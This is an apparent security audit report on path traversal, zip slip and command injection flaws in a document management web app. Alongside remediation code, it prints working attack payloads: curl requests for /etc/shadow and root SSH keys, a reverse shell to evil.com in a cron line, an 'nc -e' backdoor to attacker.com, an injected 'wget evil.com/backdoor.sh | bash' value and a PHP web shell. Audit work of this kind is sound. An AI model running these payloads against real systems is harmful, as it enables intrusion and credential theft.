# Security Audit Report - Path Traversal Vulnerability

**Report ID:** SAR-2025-PATH-004  
**Date:** September 3, 2025  
**Auditor:** Security Research Team  
**Application:** Enterprise Document Management System v5.1.3  
**File Reviewed:** vulnerable_path_traversal.py  

---

## Executive Summary

A comprehensive security audit of the Enterprise Document Management System identified **20 CRITICAL path traversal vulnerabilities** enabling arbitrary file read/write/delete operations on the host system. Additional command injection vulnerabilities through path manipulation create remote code execution opportunities. These vulnerabilities allow complete filesystem compromise and potential system takeover.

**Overall Risk Rating: CRITICAL (9.8/10)**

---

## Vulnerability Classification Overview

| Vulnerability Type | Count | Severity | Impact |
|-------------------|-------|----------|---------|
| Path Traversal (Read) | 7 | CRITICAL | Arbitrary file disclosure |
| Path Traversal (Write) | 4 | CRITICAL | System file modification |
| Path Traversal (Delete) | 1 | CRITICAL | System file deletion |
| Directory Traversal | 3 | HIGH | Information disclosure |
| Zip Slip | 1 | CRITICAL | Arbitrary file write |
| Command Injection | 2 | CRITICAL | Remote code execution |
| Symlink Attack | 1 | HIGH | Privilege escalation |
| Information Disclosure | 3 | MEDIUM | Path exposure |

---

## Detailed Vulnerability Analysis

### 1. Critical Path Traversal - File Download

**Vulnerability Type:** Path Traversal (CWE-22)  
**Severity:** **CRITICAL**  
**CVSS 3.1 Score:** 9.8 (Critical)  
**OWASP Top 10:** A01:2021 - Broken Access Control  

#### Location Details:
- **Function:** `download_file()`
- **Line Number:** 134
- **Vulnerable Code:**
```python
@app.route('/api/download/<path:filename>', methods=['GET'])
def download_file(filename):
    file_path = os.path.join(UPLOAD_FOLDER, filename)  # Direct concatenation
    if not os.path.exists(file_path):  # Only checks existence
        return jsonify({'error': 'File not found'}), 404
    return send_file(file_path, as_attachment=True)  # Serves any file
```

#### Attack Vectors:
1. **System File Extraction:**
   ```bash
   curl http://localhost:5003/api/download/../../../../etc/passwd
   curl http://localhost:5003/api/download/../../../../etc/shadow
   curl http://localhost:5003/api/download/../../../../root/.ssh/id_rsa
   ```

2. **Application Source Code Theft:**
   ```bash
   curl http://localhost:5003/api/download/../vulnerable_path_traversal.py
   curl http://localhost:5003/api/download/../../../../proc/self/environ
   ```

3. **Database Extraction:**
   ```bash
   curl http://localhost:5003/api/download/../documents.db
   ```

#### Impact:
- **Complete file system access** - Read any file accessible to application
- **Credential theft** - SSH keys, passwords, API tokens
- **Source code disclosure** - Reveals additional vulnerabilities
- **Database compromise** - Full data breach

---

### 2. Path Traversal - File Upload

**Vulnerability Type:** Path Traversal Write  
**Severity:** **CRITICAL**  
**CVSS 3.1 Score:** 9.1 (Critical)  

#### Location Details:
- **Function:** `upload_file()`
- **Line Numbers:** 83, 96
- **Vulnerable Code:**
```python
folder = request.form.get('folder', '')  # User input
if folder:
    upload_path = os.path.join(UPLOAD_FOLDER, folder)  # LINE 83
    
filename = f"{timestamp}_{file.filename}"
file_path = os.path.join(upload_path, filename)  # LINE 96
file.save(file_path)
```

#### Attack Scenarios:
1. **Overwrite System Files:**
   ```python
   # POST /api/upload
   folder = "../../../../etc/"
   file.filename = "passwd"
   # Overwrites /etc/passwd
   ```

2. **Cron Job Injection:**
   ```python
   folder = "../../../../etc/cron.d/"
   # Upload malicious cron job for persistence
   ```

3. **Web Shell Deployment:**
   ```python
   folder = "../../../../var/www/html/"
   file.filename = "shell.php"
   # Deploy web shell to web root
   ```

---

### 3. Zip Slip Vulnerability

**Vulnerability Type:** Arbitrary File Write via Archive Extraction  
**Severity:** **CRITICAL**  
**CVSS 3.1 Score:** 9.0 (Critical)  
**CWE ID:** CWE-22  

#### Location Details:
- **Function:** `restore_backup()`
- **Line Number:** 243
- **Vulnerable Code:**
```python
with zipfile.ZipFile(backup_path, 'r') as zipf:
    zipf.extractall(restore_path)  # No path validation
```

#### Exploit Creation:
```python
import zipfile

# Create malicious zip
with zipfile.ZipFile('evil.zip', 'w') as zf:
    # Escape to root directory
    zf.writestr('../../../../etc/cron.d/backdoor', 
                '* * * * * root nc -e /bin/bash attacker.com 4444')
    # Overwrite SSH authorized_keys
    zf.writestr('../../../../root/.ssh/authorized_keys',
                'ssh-rsa ATTACKER_KEY')
```

#### Impact:
- **Arbitrary file creation** anywhere on filesystem
- **System configuration modification**
- **Backdoor installation**
- **Complete system compromise**

---

### 4. Local File Inclusion (LFI)

**Vulnerability Type:** Information Disclosure via Path Traversal  
**Severity:** **CRITICAL**  
**CVSS 3.1 Score:** 8.6 (High)  

#### Location Details:
- **Function:** `include_file()`
- **Line Numbers:** 286, 290
- **Function:** `read_template()`
- **Line Numbers:** 175, 179

#### Vulnerable Code:
```python
# include_file()
full_path = os.path.join(UPLOAD_FOLDER, file_path)  # LINE 286
with open(full_path, 'r') as f:  # LINE 290
    content = f.read()

# read_template()
template_path = os.path.join(TEMPLATE_FOLDER, template_name)  # LINE 175
with open(template_path, 'r') as f:  # LINE 179
    content = f.read()
```

#### Attack Payloads:
```json
// Read system files
{"file_path": "../../../../etc/passwd"}
{"file_path": "../../../../proc/self/environ"}
{"file_path": "../../../../var/log/apache2/access.log"}

// Read application config
{"template": "../../../config.py"}
{"template": "../../../../home/user/.env"}
```

---

### 5. File Deletion Vulnerability

**Vulnerability Type:** Arbitrary File Deletion  
**Severity:** **CRITICAL**  
**CVSS 3.1 Score:** 8.8 (High)  

#### Location Details:
- **Function:** `delete_file()`
- **Line Numbers:** 255, 258, 265
- **Vulnerable Code:**
```python
full_path = os.path.join(UPLOAD_FOLDER, filepath)  # LINE 255
if not full_path.startswith(UPLOAD_FOLDER):  # Weak check
    return jsonify({'error': 'Invalid path'}), 403
os.remove(full_path)  # LINE 265
```

#### Bypass Techniques:
1. **Symbolic Link Bypass:**
   ```bash
   # Create symlink first
   ln -s /etc/passwd /var/www/documents/uploads/link
   # Delete through symlink
   DELETE /api/delete/link
   ```

2. **Path Normalization Bypass:**
   ```bash
   DELETE /api/delete/./../.././../../etc/hosts
   ```

---

### 6. Command Injection via Path Traversal

**Vulnerability Type:** OS Command Injection  
**Severity:** **CRITICAL**  
**CVSS 3.1 Score:** 9.8 (Critical)  
**CWE ID:** CWE-78  

#### Location Details:
- **Function:** `export_documents()`
- **Line Numbers:** 318-319, 324-325
- **Vulnerable Code:**
```python
source_path = os.path.join(UPLOAD_FOLDER, source_file)  # LINE 318
output_path = os.path.join(TEMP_FOLDER, f"{output_name}.{export_format}")  # LINE 319

cmd = f"convert {source_path} {output_path}"  # LINE 324
subprocess.run(cmd, shell=True)  # LINE 325 - SHELL INJECTION
```

#### Attack Vectors:
```json
// Command injection through source_file
{
    "source": "image.jpg; cat /etc/shadow > /tmp/shadow.txt",
    "output": "output"
}

// Command injection through output_name
{
    "source": "file.pdf",
    "output": "out; wget evil.com/backdoor.sh | bash"
}
```

---

### 7. Directory Traversal Listing

**Vulnerability Type:** Information Disclosure  
**Severity:** **HIGH**  
**CVSS 3.1 Score:** 7.5 (High)  

#### Location Details:
- **Function:** `list_directory()`
- **Line Numbers:** 339, 343

#### Attack Examples:
```bash
# List /etc directory
GET /api/list_directory?dir=../../../../etc/

# List root directory
GET /api/list_directory?dir=../../../../

# List user home directories
GET /api/list_directory?dir=../../../../home/
```

---

### 8. Symlink Attack Vector

**Vulnerability Type:** Symlink Following  
**Severity:** **HIGH**  
**CVSS 3.1 Score:** 7.8 (High)  

#### Location Details:
- **Function:** `create_symlink()`
- **Line Numbers:** 375-376, 380

#### Attack Chain:
```json
// Step 1: Create symlink to /etc/passwd
{
    "source": "../../../../etc/passwd",
    "link_name": "passwd_link"
}

// Step 2: Download via normal endpoint
GET /api/download/passwd_link
```

---

## Attack Scenario Matrix

### Scenario 1: Complete File System Compromise
```bash
# 1. Read sensitive files
curl http://target/api/download/../../../../etc/passwd
curl http://target/api/download/../../../../etc/shadow

# 2. Extract SSH keys
curl http://target/api/download/../../../../root/.ssh/id_rsa

# 3. Read application config
curl http://target/api/download/../.env
```

### Scenario 2: Backdoor Installation
```python
# 1. Upload backdoor to cron.d
POST /api/upload
folder: "../../../../etc/cron.d/"
file: malicious_cron

# 2. Create persistent access
* * * * * root /usr/bin/python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("evil.com",4444));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
```

### Scenario 3: Web Shell Deployment
```bash
# Upload PHP shell to web root
POST /api/upload
folder: "../../../../var/www/html/"
file: shell.php containing <?php system($_GET['cmd']); ?>
```

---

## Risk Assessment

| Factor | Rating | Details |
|--------|--------|---------|
| **Exploitability** | Trivial | Simple HTTP requests, no authentication |
| **Attack Complexity** | Very Low | Basic path traversal knowledge |
| **Privileges Required** | None | Public endpoints |
| **User Interaction** | None | Direct exploitation |
| **Scope** | Changed | Full filesystem access |
| **Confidentiality Impact** | Total | All files readable |
| **Integrity Impact** | Total | Arbitrary file write/delete |
| **Availability Impact** | High | Critical file deletion |

---

## Remediation Recommendations

### IMMEDIATE Actions (24 hours):

1. **Path Validation Function:**
```python
import os

def validate_path(user_path, base_path):
    """Securely validate paths"""
    # Resolve to absolute path
    requested_path = os.path.abspath(os.path.join(base_path, user_path))
    
    # Ensure path is within base directory
    if not requested_path.startswith(os.path.abspath(base_path)):
        raise ValueError("Path traversal attempt detected")
    
    # Check for symlinks
    if os.path.islink(requested_path):
        raise ValueError("Symbolic links not allowed")
    
    return requested_path
```

2. **Secure File Operations:**
```python
@app.route('/api/download/<filename>')
def download_file(filename):
    # Sanitize filename
    safe_filename = secure_filename(filename)
    
    try:
        # Validate path
        file_path = validate_path(safe_filename, UPLOAD_FOLDER)
        
        # Additional check
        if not os.path.exists(file_path):
            abort(404)
            
        return send_file(file_path, as_attachment=True)
    except ValueError:
        abort(403)  # Forbidden
```

3. **Zip Extraction Security:**
```python
def safe_extract(zip_path, extract_to):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        for member in zip_ref.namelist():
            # Validate each member
            if os.path.isabs(member) or ".." in member:
                raise Exception(f"Unsafe path: {member}")
            
            # Extract safely
            target_path = os.path.join(extract_to, member)
            target_path = os.path.abspath(target_path)
            
            if not target_path.startswith(os.path.abspath(extract_to)):
                raise Exception(f"Path traversal in: {member}")
                
        zip_ref.extractall(extract_to)
```

### SHORT-TERM Actions (1 week):

1. **Implement Whitelisting:**
```python
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif', 'doc', 'docx'}
ALLOWED_PATHS = ['/uploads', '/templates', '/public']

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

2. **Remove Command Execution:**
```python
# Replace subprocess with safe libraries
from PIL import Image

def convert_to_pdf(source_path, output_path):
    # Use library instead of shell command
    img = Image.open(source_path)
    img.save(output_path, "PDF")
```

3. **Implement Access Controls:**
```python
@require_auth
@check_file_permissions
def download_file(filename):
    # Only authenticated users with permissions
    pass
```

### LONG-TERM Actions (1 month):

1. **Container Isolation:**
   - Run application in Docker with restricted filesystem
   - Use read-only containers where possible
   - Implement volume mounts with minimal permissions

2. **File Storage Redesign:**
   - Use object storage (S3, Azure Blob)
   - Implement signed URLs for downloads
   - Separate metadata from file storage

3. **Security Framework:**
   - Implement OWASP dependency checks
   - Add static analysis (Bandit, Semgrep)
   - Regular penetration testing

---

## Compliance Impact

### Standards Violated:
- **OWASP ASVS 4.0:** V12.1 (File Upload), V12.3 (File Execution)
- **PCI DSS 4.0:** Requirement 6.2.4 (Secure Development)
- **ISO 27001:** A.12.2.1 (Controls Against Malware)
- **NIST 800-53:** SI-10 (Information Input Validation)
- **CIS Controls:** Control 4 (Secure Configuration)

### Potential Impact:
- Complete data breach of all stored documents
- System compromise and lateral movement
- Ransomware deployment capability
- Regulatory fines and legal liability

---

## Testing Methodology

### Automated Testing:
```bash
# Using curl for path traversal
for payload in "../../../../etc/passwd" "../../../../etc/shadow" "../../../../root/.ssh/id_rsa"; do
    curl -O "http://localhost:5003/api/download/$payload"
done

# Directory traversal enumeration
dirb http://localhost:5003/api/list_directory?dir= wordlist.txt
```

### Manual Verification:
```python
import requests

# Test upload path traversal
files = {'file': ('test.txt', b'malicious content')}
data = {'folder': '../../../../tmp/'}
r = requests.post('http://localhost:5003/api/upload', files=files, data=data)

# Test zip slip
with open('evil.zip', 'rb') as f:
    r = requests.post('http://localhost:5003/api/restore',
                     json={'backup_file': '../../../../tmp/evil.zip'})
```

---

## Conclusion

The Enterprise Document Management System contains **20 critical path traversal vulnerabilities** that completely compromise filesystem security. These vulnerabilities enable:

- **Arbitrary file read** - Including system files, credentials, source code
- **Arbitrary file write** - System configuration, backdoor installation
- **Arbitrary file deletion** - Potential system destruction
- **Command injection** - Remote code execution capability
- **Information disclosure** - Directory listings, path exposure

**Current State:** CRITICALLY INSECURE - No effective access controls on filesystem operations.

**Recommendation:** **IMMEDIATE SHUTDOWN AND REMEDIATION**. The application provides no security boundary between user input and filesystem operations. Complete redesign of file handling required.

---

**Report Classification:** CRITICAL - IMMEDIATE ACTION REQUIRED  
**Distribution:** Development Team, Security Team, CTO, CISO  
**Follow-up Required:** Emergency patch deployment within 24 hours  
**Retest Required:** Complete security assessment after remediation